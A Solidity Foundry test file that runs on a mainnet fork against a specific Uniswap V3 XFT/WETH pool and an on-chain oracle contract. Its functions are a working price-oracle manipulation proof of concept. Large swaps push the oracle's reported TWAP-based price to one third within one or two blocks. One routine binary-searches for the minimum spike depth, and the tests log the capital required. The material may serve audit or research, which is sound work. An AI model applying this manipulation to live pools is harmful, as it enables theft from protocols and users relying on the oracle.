// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.30;

import {Mainnet, MainnetForkTest} from "./MainnetFork.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IUniswapV3Pool} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import {IUniswapV3SwapCallback} from "@uniswap/v3-core/contracts/interfaces/callback/IUniswapV3SwapCallback.sol";
import {TickMath} from "@uniswap/v3-core/contracts/libraries/TickMath.sol";

interface IOracle {
    function getV3SqrtPrice(address uniswapV3Pool, uint32 intervalShort, uint32 intervalLong)
        external
        view
        returns (uint160 sqrtPriceX96);
}

IOracle constant ORACLE = IOracle(0x17881b9B731c78a546E5ab9dED28798b7C68CFA7);

contract UniswapV3ManipulateTest is MainnetForkTest, IUniswapV3SwapCallback {
    uint32 internal constant SHORT_INTERVAL = 180;
    uint32 internal constant LONG_INTERVAL = 1800;
    uint256 internal constant BLOCK_TIME = 12;

    uint160 internal constant MAX_SQRT_PRICE_LIMIT = 1_461_446_703_485_210_103_287_273_052_203_988_822_378_723_970_341;
    uint160 internal constant MIN_SQRT_PRICE_LIMIT = 4_295_128_740;

    IUniswapV3Pool public pool;
    address internal token0; // XFT
    address internal token1; // WETH

    function setUp() public override {
        super.setUp();
        pool = IUniswapV3Pool(0x701B319AFF36311F720f0a1ebD6636Dd84Bb3E8B);
        token0 = pool.token0();
        token1 = pool.token1();
        vm.label(address(pool), "XFT/WETH 0.3%");
        vm.label(address(ORACLE), "Oracle");
        vm.label(token0, "XFT");
        vm.label(token1, "WETH");
    }

    function test_Solution_Down3x_SingleBlock() public {
        uint160 startOut = ORACLE.getV3SqrtPrice(address(pool), SHORT_INTERVAL, LONG_INTERVAL);
        (, int24 startTick,,,,,) = pool.slot0();

        uint256 startTs = block.timestamp;
        uint160 target = uint160(uint256(startOut) / 3);
        deal(token0, address(this), 1e30);
        uint256 xftBefore = IERC20(token0).balanceOf(address(this));
        uint256 wethBefore = IERC20(token1).balanceOf(address(this));
        pool.swap(address(this), true, type(int256).max, target, "");

        uint256 xftIn = xftBefore - IERC20(token0).balanceOf(address(this));
        uint256 wethOut = IERC20(token1).balanceOf(address(this)) - wethBefore;
        uint160 endOut = ORACLE.getV3SqrtPrice(address(pool), SHORT_INTERVAL, LONG_INTERVAL);
        (, int24 endTick,,,,,) = pool.slot0();
        uint256 timeElapsed = block.timestamp - startTs;
        emit log_string("================ RESULT ================");
        emit log_named_int("startTick", startTick);
        emit log_named_int("endTick", endTick);
        emit log_named_uint("start   getV3SqrtPrice (sqrtPriceX96)", startOut);
        emit log_named_uint("end   getV3SqrtPrice (sqrtPriceX96)", endOut);
        emit log_named_uint("ratio   startOut * 1000 / endOut", uint256(startOut) * 1000 / endOut);
        emit log_named_uint("time elapsed (seconds)", timeElapsed);
        emit log_named_decimal_uint("initial capital: XFT sold in", xftIn, 18);
        emit log_named_decimal_uint("WETH received back", wethOut, 18);
        assertApproxEqRel(uint256(endOut) * 3, uint256(startOut), 0.001e18, "oracle output not ~= start/3");
    }

    function test_BotFight() public {
        uint160 startOut = ORACLE.getV3SqrtPrice(address(pool), SHORT_INTERVAL, LONG_INTERVAL);
        (, int24 tick0,,,,,) = pool.slot0();
        uint160 target = uint160(uint256(startOut) / 3);
        pool.increaseObservationCardinalityNext(300);
        deal(token0, address(this), 1e40);
        deal(token1, address(this), 1e33);

        int24 lo = 1;
        int24 hi = tick0 - TickMath.MIN_TICK;
        int24 depth;

        for (uint256 i = 0; i < 20; i++) {
            int24 mid = (lo + hi) / 2;
            (uint160 out,) = _trySpike(TickMath.getSqrtRatioAtTick(tick0 - mid));
            if (uint256(out) > uint256(target)) {
                lo = mid;
            } else {
                hi = mid;
                depth = mid;
            }
        }

        uint160 limit = TickMath.getSqrtRatioAtTick(tick0 - depth);
        uint256 tStart = block.timestamp;

        vm.warp(block.timestamp + BLOCK_TIME);
        uint256 x0 = IERC20(token0).balanceOf(address(this));
        uint256 w0 = IERC20(token1).balanceOf(address(this));
        pool.swap(address(this), true, type(int256).max, limit, "");
        uint256 capital = x0 - IERC20(token0).balanceOf(address(this));
        uint256 wethOut = IERC20(token1).balanceOf(address(this)) - w0;

        vm.warp(block.timestamp + BLOCK_TIME);
        pool.swap(address(this), false, int256(wethOut), MAX_SQRT_PRICE_LIMIT, "");

        uint160 finalOracle = ORACLE.getV3SqrtPrice(address(pool), SHORT_INTERVAL, LONG_INTERVAL);
        uint256 elapsed = block.timestamp - tStart;

        emit log_named_uint("1) start getV3SqrtPrice (sqrtPriceX96)", startOut);
        emit log_named_uint("2) final getV3SqrtPrice (sqrtPriceX96)", finalOracle);
        emit log_named_uint("   final / start (x1000, 333 == exactly 1/3)", uint256(finalOracle) * 1000 / startOut);
        emit log_named_uint("3) time to change (seconds)", elapsed);
        emit log_named_int("   discovered spike depth (ticks)", depth);
        emit log_named_decimal_uint("4) initial capital (XFT in the single spike)", capital, 18);
    }

    function _trySpike(uint160 limit) internal returns (uint160 oracleOnBotBlock, uint256 xftIn) {
        uint256 snap = vm.snapshotState();
        uint256 t0 = block.timestamp;

        vm.warp(t0 + BLOCK_TIME);
        uint256 x0 = IERC20(token0).balanceOf(address(this));
        uint256 w0 = IERC20(token1).balanceOf(address(this));
        pool.swap(address(this), true, type(int256).max, limit, "");
        xftIn = x0 - IERC20(token0).balanceOf(address(this));
        uint256 wethOut = IERC20(token1).balanceOf(address(this)) - w0;

        vm.warp(t0 + 2 * BLOCK_TIME);
        if (wethOut > 0) pool.swap(address(this), false, int256(wethOut), MAX_SQRT_PRICE_LIMIT, "");

        oracleOnBotBlock = ORACLE.getV3SqrtPrice(address(pool), SHORT_INTERVAL, LONG_INTERVAL);
        vm.revertToState(snap);
    }
}
